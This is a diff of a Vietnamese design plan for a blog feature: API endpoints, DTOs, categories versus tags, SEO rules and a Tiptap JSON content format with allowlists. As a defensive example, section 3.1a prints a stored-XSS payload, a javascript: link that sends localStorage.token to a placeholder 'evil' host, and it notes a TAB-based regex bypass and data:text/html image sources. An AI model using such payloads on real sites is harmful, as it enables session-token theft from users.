@@ -2,10 +2,10 @@
 
 |                |                                                                                                                                                                       |
 | -------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **Status**     | **Bản thảo để thảo luận** (2026-08-30). Chưa chốt gì, chưa viết dòng code nào. Mọi mục đánh dấu 🔸 là chỗ cần bạn quyết trước khi làm                                     |
+| **Status**     | ✅ **Đã chốt** (2026-08-30) · **rà vòng 2** — thêm 6 chỗ sẽ vỡ lúc code + 6 lỗ contract (chỉ mục ở **§12.3**) · **rà vòng 3** — chốt **hai trục phân loại: chuyên mục + thẻ** (**§2.6**), kéo theo sửa §1–§2, §4.5, §5.2, §6, §7, §10–§12. · ✅ **Đã implement** (2026-08-31) — cả FE lẫn BE; sai lệch so với plan ghi ở **§12.4**                                     |
 | **Mục tiêu**   | Bài viết soạn/sửa trong `apps/admin`, lưu ở DB backend, nhấn **Publish** thì mới xuất hiện công khai ở `apps/web`, có đủ SEO (metadata, OG, canonical, sitemap, JSON-LD) |
-| **Contract**   | `http://localhost:3101/docs-json` — **hiện chưa có endpoint blog nào**. §2 là contract đề xuất để mang sang repo backend                                                 |
-| **Liên quan**  | `docs/data-layer.md` (bắt buộc — và §4 dưới đây là **ngoại lệ đầu tiên** của §6 doc đó), `docs/monorepo-plan.md`, `docs/admin-plan.md`                                   |
+| **Contract**   | `http://localhost:3101/docs-json` — **đã có 12 endpoint blog**. §2 là contract gốc; bản đã implement ở `docs/blog.md` của repo `noalhub-be`                        |
+| **Liên quan**  | `docs/data-layer.md` §7 (ngoại lệ đường đọc của blog đã được ghi chính thức ở đó; §4 dưới đây là phần chi tiết triển khai), `docs/monorepo-plan.md`, `docs/admin-plan.md`                                   |
 
 ---
 
@@ -13,12 +13,11 @@
 
 Ba điều đáng biết trước khi bàn chi tiết:
 
-**a) Đây là feature đầu tiên của repo có nội dung công khai.** Mọi thứ đang có
-(`chat`, `friends`, `users`, `admin`) đều nằm sau đăng nhập, đọc bằng React Query ở client
-với Bearer token. Blog thì ngược lại hoàn toàn: không token, phải render ở **server** thì
-Googlebot mới đọc được. Nghĩa là nó không dùng lại được đường dữ liệu hiện tại, phải mở
-một đường thứ hai — xem §4. Đây là quyết định kiến trúc lớn nhất của plan này, không phải
-chuyện SEO vặt.
+**a) Đây là feature đầu tiên của repo có nội dung công khai.** Mọi thứ đang có (`chat`,
+`friends`, `users`, `admin`) nằm sau đăng nhập, đọc bằng React Query ở client với Bearer token.
+Blog ngược lại: không token, phải render ở **server**. Nó không dùng lại được đường dữ liệu hiện
+tại mà phải mở một đường thứ hai (§4) — đây là quyết định kiến trúc lớn nhất của plan, không
+phải chuyện SEO vặt.
 
 **b) FE không "lưu vào database" được.** Nguồn sự thật là NestJS. Không có endpoint blog thì
 admin không có chỗ ghi, web không có chỗ đọc. **§2 phải chốt với backend trước**, y như bài
@@ -32,7 +31,8 @@ học ở `admin-plan.md` §0 — bắt đầu bằng FE + mock là chắc chắ
 | `apps/web/app/(protected)/page.tsx` | Trang `/` nằm **trong** `(protected)` | Trang chủ đứng sau `AuthGuard`: crawler vào `https://noalhub.duckdns.org` chỉ thấy màn hình chờ rồi bị đá sang `/login`. Domain gốc hiện **không index được** |
 
 Blog kéo theo việc phải có một vùng công khai thật sự trong `apps/web` (`(public)` route
-group) — 🔸 và câu hỏi kèm theo: `/` sau này là trang chủ công khai (landing) hay vẫn là app?
+group). ✅ Còn `/` thì **giữ nguyên trong `(protected)`** đợt này — chấp nhận domain gốc không
+index được, và `robots.ts` disallow `/` cho khớp (§6.1).
 
 ---
 
@@ -40,17 +40,26 @@ group) — 🔸 và câu hỏi kèm theo: `/` sau này là trang chủ công kha
 
 **Có trong đợt này**
 
-- `apps/web`: `/blog` (danh sách, phân trang), `/blog/[slug]` (bài viết), `/blog/tag/[tag]`,
+- `apps/web`: `/blogs` (danh sách, phân trang `?page=`), `/blogs/[slug]` (bài viết),
+  `/blogs/category/[slug]` (chuyên mục), `/blogs/tag` + `/blogs/tag/[tag]` (thẻ),
   `sitemap.xml`, `robots.txt`, RSS, OG image.
+  Kèm **layout công khai riêng** (§6.1), **mục lục trong bài** (§3.3) và khối **bài liên quan** (§2.5).
+- **Hai trục phân loại** — `category` (chuyên mục, 1 bài 1 mục) và `tags` (thẻ, 0..n).
+  Mô hình, ranh giới và hệ quả SEO ở **§2.6**; đó là phần nên đọc trước khi chốt §2 với backend.
 - `apps/admin`: `/posts` (bảng), `/posts/new`, `/posts/[id]` (editor), publish/unpublish.
 - `packages/api/src/blog/` theo `docs/data-layer.md`, **cộng một đường đọc server-only** (§4).
-- Renderer nội dung dùng chung cho web (render thật) và admin (preview) — một code path (§8).
+- Renderer Tiptap JSON dùng chung cho web (render thật) và admin (preview) — một code path (§3, §8).
+
+✅ **URL công khai số nhiều `/blogs`**; path API backend giữ số ít (`/blog/posts`,
+`/admin/blog/...`). Hai thứ độc lập — đừng đồng bộ cho "đẹp".
 
 **Cố tình KHÔNG có trong đợt này** (ghi ra để khỏi phình dần):
 
-comment của độc giả · like/share counter · full-text search · đa ngôn ngữ (i18n) ·
-newsletter · lịch đăng bài (scheduled publish — xem §5.3) · phân quyền tác giả nhiều cấp
-(hiện `role` chỉ có `user | admin`, mọi admin sửa được mọi bài).
+comment của độc giả · like/share counter · **đếm lượt xem** · full-text search · đa ngôn ngữ
+(i18n) · newsletter · lịch đăng bài (scheduled publish — xem §5.3) · trang tác giả
+(`/blogs/author/[id]`) · syntax highlighting cho `codeBlock` (§3.1c) · **chuyên mục lồng nhau**
+(cây cha–con — §2.6) · phân quyền tác giả nhiều cấp (hiện `role` chỉ có `user | admin`, mọi
+admin sửa được mọi bài).
 
 ---
 
@@ -60,10 +69,30 @@ newsletter · lịch đăng bài (scheduled publish — xem §5.3) · phân quy�
 
 | Method | Path | Ghi chú |
 | --- | --- | --- |
-| `GET` | `/blog/posts` | `page`, `limit` (≤ 50), `tag`, `q`. **Chỉ trả bài `published`** — lọc ở backend, không phải ở FE. Item là `BlogPostListItemDto` (không kèm `content`, nếu không list 20 bài nặng vài trăm KB) |
+| `GET` | `/blog/posts` | `page`, `limit` (trần 50; FE dùng **10**), `category`, `tag` — hai bộ lọc **độc lập**, cùng gửi thì AND. Cả hai nhận **slug**, không phải id (§2.6). **Chỉ trả bài `published`** — lọc ở backend, không phải ở FE. Sort mặc định **`publishedAt DESC`**. Item là `BlogPostListItemDto` (§2.3a — không kèm `content`, nếu không list 20 bài nặng vài trăm KB) |
 | `GET` | `/blog/posts/{slug}` | Trả `BlogPostDto` đầy đủ. 404 `POST_NOT_FOUND` khi không tồn tại **hoặc chưa publish** — không phân biệt, nếu không đây là kênh dò slug bài nháp |
-| `GET` | `/blog/tags` | Danh sách tag + số bài, cho `/blog/tag/[tag]` và sitemap |
-| `GET` | `/blog/sitemap-entries` | 🔸 `slug` + `updatedAt` của **mọi** bài published, không phân trang. Cần cho `sitemap.ts` và `generateStaticParams`. Nếu backend không muốn có endpoint riêng thì phải cho `GET /blog/posts?limit=…` một giới hạn đủ lớn — nhưng khi số bài vượt limit thì sitemap **âm thầm thiếu URL**, đó là lý do nên tách endpoint |
+| `GET` | `/blog/categories` | Danh sách chuyên mục (`slug`, `name`, `description`, `postCount`), sort theo `order`. **Chỉ đếm bài `published`** — `postCount` mà tính cả bài nháp thì nav hiện "3 bài" rồi bấm vào thấy 1 |
+| `GET` | `/blog/tags` | Danh sách thẻ (`slug`, `name`, `postCount`) cho `/blogs/tag`. **Không** dùng cho sitemap — trang thẻ `noindex` (§2.6, §6.5) |
+| `GET` | `/blog/sitemap-entries` | ✅ **Endpoint riêng, đã chốt.** Trả `slug` + `updatedAt` của **mọi** bài published, **không phân trang, không limit**, không kèm `content`/`author`/`seo`. Dùng cho `sitemap.ts` và `generateStaticParams` (§4.4). Không tách ra mà dùng `GET /blog/posts?limit=…` thì khi số bài vượt limit, sitemap **âm thầm thiếu URL** — build vẫn xanh nên không ai phát hiện |
+
+#### 2.1a Envelope, sort, limit — ba thứ chặn ngay lúc viết `types.ts`
+
+**Envelope của list**: dùng đúng convention đã có trong repo (`AdminUserList` ở
+`packages/api/src/admin/types.ts`), đừng đẻ ra kiểu thứ hai:
+
+```
+{ items: BlogPostListItemDto[], total: number, page: number, limit: number }
+```
+
+`total` không phải để trang trí: §4.5 cần nó mới `notFound()` được khi `?page` vượt tổng số trang.
+
+**Sort — hai bảng hai kiểu, cố ý.** Public sort `publishedAt DESC`; admin (§2.2) sort
+`updatedAt DESC`. Đừng đồng bộ cho "nhất quán": sửa một lỗi chính tả ở bài cũ mà đẩy nó lên
+đầu trang blog là sai.
+
+**Bỏ `q` khỏi endpoint công khai.** §1 đã ghi full-text search nằm ngoài phạm vi; để `q` trong
+contract là bảo backend làm một tham số không ai gọi, rồi nửa năm sau không ai dám xoá. Thêm
+lại lúc thật sự làm search.
 
 ### 2.2 Endpoint admin (auth + role `admin`)
 
@@ -73,9 +102,24 @@ newsletter · lịch đăng bài (scheduled publish — xem §5.3) · phân quy�
 | `GET` | `/admin/blog/posts/{id}` | Theo **id**, không theo slug — slug đổi được, id thì không |
 | `POST` | `/admin/blog/posts` | Tạo bản nháp. Trả 201 + `BlogPostDto` |
 | `PATCH` | `/admin/blog/posts/{id}` | Lưu nháp. Xem §7.3 về `version` và 409 |
-| `POST` | `/admin/blog/posts/{id}/publish` | **Tách khỏi PATCH** — khác nhau về audit, về validate (publish bắt buộc có `title`/`slug`/`metaDescription`, lưu nháp thì không), và về side effect (đặt `publishedAt`, bắn revalidate §5) |
+| `POST` | `/admin/blog/posts/{id}/publish` | **Tách khỏi PATCH** — khác nhau về audit, về validate (publish bắt buộc có `title`/`slug`/`metaDescription`/**`categoryId`**, lưu nháp thì không), và về side effect (đặt `publishedAt`, bắn revalidate §5) |
 | `POST` | `/admin/blog/posts/{id}/unpublish` | Gỡ khỏi công khai, giữ nội dung |
-| `DELETE` | `/admin/blog/posts/{id}` | 🔸 Xoá mềm hay xoá cứng? Xoá cứng một bài đã index là để lại 404 vĩnh viễn ở Google |
+| `DELETE` | `/admin/blog/posts/{id}` | ✅ **Xoá mềm**: chuyển `status = archived` (đã có trong DTO), hàng vẫn nằm trong DB, slug vẫn bị chiếm. Public không trả bài `archived`. Không có xoá cứng ở UI — xoá cứng một bài đã index là để lại 404 vĩnh viễn ở Google |
+
+**Chuyên mục và thẻ** (§2.6) — chuyên mục là tập được quản lý, thẻ thì mọc theo bài, nên hai
+bảng CRUD không đối xứng:
+
+| Method | Path | Ghi chú |
+| --- | --- | --- |
+| `GET` | `/admin/blog/categories` | Mọi chuyên mục + `postCount` tính **cả bài nháp** (khác `/blog/categories` công khai) |
+| `POST` | `/admin/blog/categories` | `{ slug, name, description?, order? }`. `CATEGORY_SLUG_TAKEN` khi trùng |
+| `PATCH` | `/admin/blog/categories/{id}` | Đổi tên, mô tả, thứ tự. ⚠️ Đổi **slug** của chuyên mục làm hỏng URL `/blogs/category/<cũ>` đã index — xem §2.6 |
+| `DELETE` | `/admin/blog/categories/{id}` | **Chỉ khi rỗng.** Còn bài thì trả 409 `CATEGORY_NOT_EMPTY`, kèm số bài. Cho xoá chuyên mục còn bài là hoặc bỏ bài mồ côi không publish được, hoặc âm thầm dời chúng đi đâu đó — cả hai đều tệ hơn một lỗi 409 |
+| `GET` | `/admin/blog/tags` | Mọi thẻ + `postCount` (cả nháp) — cấp dữ liệu cho ô multi-select ở editor |
+| `POST` | `/admin/blog/tags` | Tạo thẻ mới **từ trong editor** (§7.1a). `{ name }` → backend tự `slugify`. Trùng slug thì **trả về thẻ đang có**, không phải 409: người viết chỉ muốn gắn thẻ, không quan tâm nó mới hay cũ |
+
+Không có `DELETE` cho thẻ đợt này: thẻ mồ côi (0 bài) không hiện ở đâu cả vì `/blog/tags` lọc
+`postCount > 0`. Dọn thẻ rác là việc của một màn hình quản trị sau, không chặn gì.
 
 ### 2.3 `BlogPostDto` — đề xuất
 
@@ -84,12 +128,14 @@ id                string
 slug              string          # unique, kebab-case, đã bỏ dấu tiếng Việt
 title             string
 excerpt           string | null   # tóm tắt hiển thị ở list; KHÁC metaDescription
-content           <tuỳ §3>
+content           object          # Tiptap/ProseMirror JSON doc, cột `jsonb` (§3).
+                                  # Backend validate theo allowlist §3.1 khi ghi
 contentText       string          # plain text do BACKEND sinh — dùng cho reading time,
                                   # excerpt tự động, và search sau này. Sinh ở FE thì
                                   # mỗi app một kiểu và không query được ở DB
 coverImageUrl     string | null
-tags              string[]
+category          { slug, name } | null   # null CHỈ hợp lệ khi status = draft (§2.6)
+tags              { slug, name }[]        # 0..n, KHÔNG phải string[] — xem §2.6
 status            "draft" | "published" | "archived"
 publishedAt       string | null   # null khi chưa từng publish
 updatedAt         string
@@ -104,71 +150,290 @@ seo: {
 }
 ```
 
+⚠️ Ghi (`POST`/`PATCH`) thì gửi **`categoryId`** và **`tagIds`**; đọc thì nhận
+`category` / `tags` đã nở sẵn `{ slug, name }`. Bất đối xứng này là cố ý: FE không phải tra
+bảng để hiển thị, còn backend không phải đoán ý từ một chuỗi tên.
+
 **Mã lỗi mới** cho `packages/api/src/errors.ts`: `POST_NOT_FOUND`, `SLUG_TAKEN`,
-`POST_CONFLICT` (§7.3), `POST_NOT_PUBLISHABLE` (thiếu field bắt buộc lúc publish).
+`POST_CONFLICT` (§7.3), `POST_NOT_PUBLISHABLE` (thiếu field bắt buộc lúc publish — gồm cả
+**thiếu chuyên mục**), `CATEGORY_NOT_FOUND`, `CATEGORY_SLUG_TAKEN`, `CATEGORY_NOT_EMPTY`.
+
+### 2.3a `BlogPostListItemDto` — đề xuất
+
+Cái mà `GET /blog/posts` trả trong `items`. Nó là **DTO riêng**, không phải `BlogPostDto` bị
+cắt bớt tuỳ hứng — và khác biệt quan trọng nhất là `readingMinutes`:
+
+```
+id              string
+slug            string
+title           string
+excerpt         string          # KHÔNG nullable ở list — xem §2.3b
+coverImageUrl   string | null
+category        { slug, name }   # KHÔNG nullable ở list — list chỉ có bài published,
+                                 # mà publish thì bắt buộc có chuyên mục (§2.6)
+tags            { slug, name }[]
+publishedAt     string
+updatedAt       string
+author          { id, displayName, avatarUrl }
+readingMinutes  number          # BACKEND tính — xem dưới
+```
+
+⚠️ **`readingMinutes` phải do backend trả.** List item cố tình không có `content` lẫn
+`contentText` (để list 20 bài không nặng vài trăm KB), nên FE **không có gì để tính reading
+time ở trang danh sách**. `packages/core/src/blog/reading-time.ts` (§10) vì vậy chỉ phục vụ
+trang bài viết. Không muốn backend tính thì phải bỏ reading time khỏi danh sách — không có
+đường thứ ba.
+
+### 2.3b Chuỗi fallback của `excerpt` / `description`
+
+`excerpt` và `seo.metaDescription` đều nullable, nên tồn tại bài **không có description nào
+cả** — một lỗi SEO im lặng, không ai thấy trên UI. Đóng chuỗi này ở **hai** chỗ:
+
+- **Backend, lúc ghi:** `excerpt` trống thì tự sinh từ `contentText` (~155 ký tự, cắt ở ranh
+  giới từ) — cùng chỗ nó đã sinh `contentText` (§2.3). Nhờ vậy `BlogPostListItemDto.excerpt`
+  không nullable và trang danh sách không phải xử lý ca rỗng.
+- **FE, lúc dựng metadata (§6.2):** `seo.metaDescription ?? excerpt`. Không cần tầng thứ ba —
+  backend đã đảm bảo `excerpt` luôn có.
 
 ### 2.4 Lịch sử slug — đừng bỏ qua
 
 Bài đã publish mà đổi slug thì URL cũ đã nằm trong index của Google, trong bookmark, trong
 link người khác dẫn về. Không xử lý là **mất sạch backlink**.
 
-🔸 Đề xuất: backend giữ bảng `blog_post_slugs` (slug cũ → post id). `GET /blog/posts/{slug}`
-khi khớp slug cũ thì vẫn trả bài, kèm cờ để FE biết đây không phải slug chính:
+✅ **Đã chốt (2026-08-30):** backend giữ bảng `blog_post_slugs` (`old_slug` unique → `post_id`).
+Mỗi lần đổi slug của bài **đã publish** thì chèn slug cũ vào bảng; `GET /blog/posts/{slug}` tra bảng
+chính trước, không thấy thì tra bảng phụ và **vẫn trả bài** — nhưng body là slug mới, để FE biết
+đây không phải slug chính. `SLUG_TAKEN` phải kiểm **cả hai** bảng, nếu không bài B chiếm được
+slug cũ của bài A và ánh xạ redirect thành mơ hồ.
 
 ```
 GET /blog/posts/slug-cu  →  200 { ...post, slug: "slug-moi" }
 ```
 
-FE so `post.slug !== params.slug` → `permanentRedirect(/blog/${post.slug})` (301). Cách này
+FE so `post.slug !== params.slug` → `permanentRedirect(/blogs/${post.slug})` (301). Cách này
 gọn hơn là bắt backend trả 301, vì FE phải dựng URL của chính nó.
 
+### 2.5 Bài liên quan — không cần endpoint mới
+
+Cuối mỗi bài có khối "Bài liên quan" (3 bài), và `not-found.tsx` (§6.4) cũng cần "vài bài mới
+nhất". Cả hai dùng lại `GET /blog/posts`, không thêm endpoint:
+
+- **Bài liên quan**: `?category=<slug chuyên mục của bài>&limit=4`, FE loại slug hiện tại rồi
+  lấy 3. Lấy 4 chứ không phải 3 chính là để bù cho cái bị loại — nếu không, bài nào cũng chỉ
+  còn 2.
+- **`not-found.tsx`**: `?limit=3` (mới nhất, không lọc gì).
+
+**Vì sao lọc theo chuyên mục chứ không theo thẻ.** Mỗi bài có **đúng một** chuyên mục, nên
+"bài liên quan" là một truy vấn xác định. Nếu lọc theo thẻ thì phải chọn *thẻ nào* trong mảng
+— mà thứ tự của `tags` không được contract cam kết là có nghĩa (§2.6), nên "thẻ đầu tiên"
+chỉ là thẻ nào người viết gõ trước, một chi tiết ngẫu nhiên. Muốn khá hơn thì phải xếp hạng
+theo **số thẻ trùng**, và việc đó cần một truy vấn riêng ở backend — không đáng cho đợt này.
+
+Ghi ra để sau này không ai đi thêm `/blog/posts/{slug}/related` cho một việc mà một tham số
+query đã làm xong.
+
+### 2.6 ✅ Đã chốt — hai trục: **chuyên mục** và **thẻ**
+
+Đây là quyết định schema, sửa sau rất đau, nên chốt trước khi mang §2 sang backend.
+
+**Chúng không phải một thứ**, và cách phân biệt không nằm ở tên gọi mà ở câu hỏi này: *xoá
+hết nhãn của một bài đi, bài đó có còn biết nó nằm ở đâu không?* Nếu không → thứ đang thiếu là
+chuyên mục, không phải thẻ.
+
+| | **Chuyên mục** (`category`) | **Thẻ** (`tags`) |
+| --- | --- | --- |
+| Số lượng / bài | **đúng 1** (bắt buộc lúc publish) | 0..n |
+| Tập giá trị | **cố định, do admin quản lý** (§2.2) | mọc thêm theo bài, tạo ngay trong editor |
+| Vai trò | phân loại **dọc** — xương sống điều hướng, nằm ở nav của layout công khai (§6.1) | mô tả **ngang** — liên kết chéo giữa các bài cùng chủ đề nhỏ |
+| URL | `/blogs/category/[slug]` | `/blogs/tag/[tag]` |
+| SEO | ✅ **index + vào sitemap** | ⚠️ **`noindex, follow`**, không vào sitemap |
+| Dùng cho "bài liên quan" | ✅ (§2.5) | ❌ |
+
+**Cả hai là entity `{ slug, name }`, không phải `string[]`.** Đây là điểm dễ làm sai nhất.
+Lưu chuỗi tự do thì `Next.js` / `NextJS` / `nextjs` thành ba nhãn khác nhau; và không có chỗ
+nào giữ được **tên hiển thị** riêng với **slug trên URL** — mà hai thứ đó bắt buộc khác nhau:
+URL cần `next-js`, tiêu đề trang cần `Next.js`. Bảng ở backend:
+
+```
+blog_categories (id, slug unique, name, description, order)
+blog_tags       (id, slug unique, name)
+blog_post_tags  (post_id, tag_id)          -- bảng nối
+blog_posts.category_id                      -- FK, NOT NULL khi status = published
+```
+
+**Hệ quả SEO — vì sao chỉ một trục được index.** Trang chuyên mục và trang thẻ đều là lát cắt
+của cùng một tập bài, tức là **gần trùng nội dung với nhau và với `/blogs`**. Cho index cả hai
+là tự tạo ra hàng chục URL nội dung mỏng — đúng bệnh kinh điển của WordPress: mỗi thẻ một bài,
+index phình lên toàn trang rỗng. Chọn chuyên mục làm trục được index vì nó là **tập cố định,
+có mô tả, đủ bài** — còn thẻ thì không kiểm soát được số lượng. Trang thẻ vẫn tồn tại và vẫn
+đi link được cho người đọc, chỉ là `noindex, follow`: Google không index chúng nhưng vẫn đi
+theo link vào các bài bên trong.
+
+**Ràng buộc kéo theo, cái nào cũng có lý do:**
+
+- **`categoryId` bắt buộc lúc publish, không bắt buộc lúc lưu nháp** (§2.2). Bắt buộc ngay từ
+  lúc tạo thì mỗi lần mở `/posts/new` đều phải quyết định một chuyện chưa nghĩ tới.
+- ⚠️ **Đổi `slug` của chuyên mục làm hỏng URL đã index.** Không dựng bảng lịch sử như
+  `blog_post_slugs` (§2.4) cho việc này — chuyên mục là tập nhỏ và hiếm khi đổi. Đổi lại,
+  admin phải **cảnh báo rõ** ở màn hình chuyên mục (§7.1a), cùng tinh thần với cảnh báo đổi
+  slug bài ở §7.2. Đây là chỗ chấp nhận rủi ro có ý thức, không phải bỏ sót.
+- **Chuyên mục phẳng, không có cây cha–con.** Cây kéo theo: URL lồng nhau, breadcrumb sâu
+  nhiều tầng, chuyện dời cả nhánh, và câu hỏi "bài ở mục cha có hiện trong mục con không".
+  Với số bài hiện tại thì đó là cấu trúc để không dùng tới. Nằm trong danh sách "cố tình
+  không có" ở §1.
+- **`tags` là tập, không phải danh sách có thứ tự.** Contract **không** cam kết thứ tự phần
+  tử có ý nghĩa. Đừng viết code nào dựa vào `tags[0]` — đó chính là lỗi mà §2.5 vừa bỏ đi.
+- **Xoá chuyên mục chỉ khi rỗng** (409 `CATEGORY_NOT_EMPTY`, §2.2). Bài không có chuyên mục
+  thì không publish được, nên xoá bừa là làm mồ côi bài đang chạy công khai.
+
 ---
 
-## 3. 🔸 Quyết định lớn #1 — định dạng nội dung
+## 3. ✅ Đã chốt — định dạng nội dung là **Tiptap JSON**
 
-Đây là thứ khó đổi nhất sau này (đã có 50 bài rồi thì migrate là viết script chuyển đổi),
-nên chốt kỹ ngay.
+Nội dung lưu ở DB dạng `jsonb` (Tiptap/ProseMirror document), render ra React element bằng
+renderer tự viết. **Không** có đường nào nhả HTML thô.
 
-| | Markdown (text) | HTML sanitize ở BE | **Tiptap JSON** (đề xuất) |
-| --- | --- | --- | --- |
-| Editor | textarea + preview | WYSIWYG | WYSIWYG |
-| Lưu ở DB | `text` | `text` | `jsonb` |
-| Render ở web | `react-markdown` + `rehype-sanitize` | `dangerouslySetInnerHTML` | renderer tự viết → React element |
-| Rủi ro XSS | thấp (phải cấu hình đúng sanitize) | **cao** — sai một dòng allowlist là stored XSS trên domain chính | **không có** — không có đường nào ra HTML thô |
-| Kiểm soát output | trung bình | thấp | cao: heading tự sinh `id` cho anchor, ảnh đi qua `next/image`, link ngoài tự thêm `rel="nofollow noopener"` |
-| Chi phí | thấp | thấp | **cao nhất**: viết renderer (~150–200 dòng) + học Tiptap |
-| Người viết là ai | hợp nếu chỉ có bạn viết | — | hợp nếu sau này có người không biết Markdown viết bài |
+Lý do quyết định không phải UX của editor mà là **trust boundary**: nội dung do admin nhập,
+nhưng nó được render trên `noalhub.duckdns.org` — cùng origin với app chat đang giữ token
+trong localStorage. Một stored XSS ở đó là đọc được token của mọi user. Lưu JSON có schema
+thì FE **không có cách nào** nhả HTML thô ra, kể cả khi ai đó sửa ẩu về sau. Đó là loại an
+toàn do kiến trúc chứ không do kỷ luật. Kèm theo: WYSIWYG cho người không biết Markdown, và
+kiểm soát output ở renderer (heading tự sinh `id` cho anchor, ảnh đi qua `next/image`, link
+ngoài tự thêm `rel="nofollow noopener"`).
 
-**Đề xuất: Tiptap, lưu JSON, render bằng renderer riêng.** Lý do quyết định không phải là
-UX của editor mà là **trust boundary**: nội dung do admin nhập, nhưng nó được render trên
-`noalhub.duckdns.org` — cùng origin với app chat đang giữ token trong localStorage. Một
-stored XSS ở đó là đọc được token của mọi user. Lưu JSON có schema thì FE **không có cách
-nào** nhả HTML thô ra, kể cả khi ai đó sửa ẩu về sau. Đó là loại an toàn do kiến trúc chứ
-không do kỷ luật.
+Chi phí đã chấp nhận: renderer ~150–200 dòng + học Tiptap.
 
-Nếu thấy chi phí renderer quá cao cho quy mô hiện tại → chọn **Markdown**, đừng chọn HTML.
+### 3.1 Node/mark cho phép — ✅ allowlist đã chốt
 
-🔸 Cần bạn chốt: **ai sẽ viết bài?** Chỉ mình bạn (→ Markdown đủ dùng, rẻ hơn nhiều) hay có
-người khác (→ WYSIWYG là bắt buộc).
+Schema của editor, schema validate ở backend, và renderer phải là **cùng một danh sách**:
+
+| Loại | Cho phép |
+| --- | --- |
+| Node | `doc`, `paragraph`, `heading` (level 2–3), `text`, `bulletList`, `orderedList`, `listItem`, `blockquote`, `codeBlock`, `horizontalRule`, `hardBreak`, `image` |
+| Mark | `bold`, `italic`, `strike`, `code`, `link` |
+
+`heading` chỉ 2–3 vì `<h1>` là tiêu đề bài (§6.2). Node lạ (do bản Tiptap sau này thêm
+extension) → renderer **bỏ qua im lặng**, không throw: một node lạ không được làm trắng cả
+trang bài viết. Log ở dev là đủ.
+
+### 3.1a ⚠️ Allowlist **attribute** — nửa còn thiếu của trust boundary
+
+Bảng trên mới chặn *loại* node/mark, chưa chặn *giá trị attribute* — và lỗ này nằm đúng trong
+lập luận của §3. Lưu JSON chặn được `<script>`, nhưng:
+
+```json
+{ "type": "text", "text": "bấm đây",
+  "marks": [{ "type": "link",
+              "attrs": { "href": "javascript:fetch('https://evil/?t='+localStorage.token)" } }] }
+```
+
+là một mark **hợp lệ theo allowlist §3.1**, và renderer sẽ đặt thẳng chuỗi đó vào `<a href>`.
+Đó chính xác là stored XSS mà §3 tuyên bố đã đóng — đọc được token của mọi user, cùng kịch bản
+đã mô tả. `image.src` với `data:text/html` cũng vậy.
+
+Nên attrs phải được allowlist **theo giá trị**, ở cả ba chỗ (zod §4.2, backend §3.2, renderer):
+
+| Node/mark | Attr | Ràng buộc |
+| --- | --- | --- |
+| `link` | `href` | Chỉ scheme `http:`, `https:`, `mailto:`. Parse bằng `new URL()` rồi so `protocol` — **đừng** regex trên chuỗi thô: chèn ký tự điều khiển vào giữa (`java` + TAB + `script:`) là lách được regex mà browser vẫn chạy |
+| `link` | `target`, `rel` | **Không nhận từ dữ liệu.** Renderer tự đặt: link ngoài → `target="_blank" rel="nofollow noopener"` |
+| `image` | `src` | Chỉ `https:`, và host phải nằm trong `images.remotePatterns` (§6.2) — ngoài danh sách thì `next/image` chết ở production, thà chặn ngay lúc ghi |
+| `image` | `alt` | string, cho phép rỗng (ảnh trang trí), **không** cho `null` |
+| `image` | `width`, `height` | `number \| null` — xem §3.1b |
+| `heading` | `level` | Chỉ `2 \| 3`. Đây là ràng buộc **giá trị**, khác với việc cho phép node `heading` |
+| `codeBlock` | `language` | `string \| null`, trong danh sách cố định — xem §3.1c |
+| Mọi node | attr khác | **Loại bỏ khi ghi.** Tiptap tự thêm attr theo bản (`textAlign`, `class`, `style`…); `style`/`class` đi thẳng vào DOM là một lối defacement/XSS khác |
+
+Renderer gặp attr sai ràng buộc thì **không render thẻ đó nhưng giữ text con** (link hỏng
+thành chữ thường, ảnh hỏng thì bỏ) — cùng tinh thần "bỏ qua im lặng" ở §3.1, không throw.
+
+### 3.1b Node `image` phải có `width`/`height` ngay từ đợt 1
+
+`next/image` cần `width` + `height`, hoặc `fill` + container đã định chiều cao. Ảnh dán URL
+(§9) thì không có kích thước → hoặc `fill` với aspect ratio đoán bừa (ảnh méo), hoặc rơi về
+`<img>` (mất tối ưu, và `remotePatterns` thành vô nghĩa), hoặc ăn **CLS** — một chỉ số Core
+Web Vitals, tức là nằm đúng trong mục tiêu SEO của plan này.
+
+Thêm sau là phải **migrate `jsonb` của mọi bài đã viết**, nên làm luôn:
+
+- Node `image` có thêm `width`, `height` (`number | null`).
+- Editor tự đo lúc dán URL (`new Image()` → `naturalWidth`/`naturalHeight`) rồi ghi vào node.
+  Không đo được (ảnh chết, CORS) thì để `null` và cảnh báo tại chỗ.
+- Renderer: có kích thước → `next/image` với `width`/`height` thật; `null` → wrapper
+  `aspect-video` + `fill` + `object-contain`.
+
+### 3.1c `codeBlock` — lưu `language`, chưa tô màu
+
+Phải quyết **bây giờ** vì `language` là attr trong schema; thêm sau là migrate.
+
+- Lưu `language` (`string | null`) trong một allowlist ngôn ngữ cố định — cùng danh sách ở
+  editor, backend và renderer, y như §3.1.
+- Đợt này renderer chỉ ra `<pre><code class="language-x">`, **không tô màu**. Syntax
+  highlighting là chuyện của CSS/đợt sau và không đụng tới dữ liệu, nên bỏ qua bây giờ không
+  khoá đường nào.
+- ⚠️ Đừng cắm `CodeBlockLowlight` của Tiptap vào admin trước khi chốt việc này — nó đổi shape
+  của node `codeBlock` trong JSON.
+
+### 3.2 Ràng buộc kéo theo
+
+- **Backend phải validate JSON theo allowlist khi ghi**, không chỉ tin FE. `content` là
+  `jsonb`, một client tự chế POST được gì tuỳ ý. Đây là nửa còn lại của trust boundary trên.
+- **`contentText` do backend sinh** từ JSON — walk cây lấy `text` (lý do ở §2.3).
+- **Renderer nằm ở `packages/ui/src/blog/post-content.tsx`** — một code path cho web (render
+  thật) và admin (preview), xem §8.
+- **Zod schema cho document** ở `packages/api/src/blog/schemas.ts`, đệ quy (`z.lazy`), dùng
+  chung cả đường client lẫn đường server (§4.2). Đây cũng là thứ chặn "backend đổi shape làm
+  trắng trang public".
+- **Node `image` đợt đầu chỉ có `src`, `alt`, `width`, `height`** (§3.1b). Nhập bằng
+  upload (kéo-thả, dán ảnh, hoặc nút chọn file) hoặc dán URL — cả hai đường đều đi qua
+  `isSafeImageSrc` (§9).
+- **Renderer KHÔNG được import `@tiptap/*`.** Nó chỉ nhận JSON đã typed + React. Chạm vào
+  Tiptap là kéo cả bộ editor vào bundle công khai của `apps/web`, nơi không ai soạn thảo gì.
+  Tiptap chỉ tồn tại trong `apps/admin`.
+- **Backend giới hạn kích thước và độ sâu của `content`** khi ghi (ví dụ ≤ 512 KB, độ sâu ≤ 20).
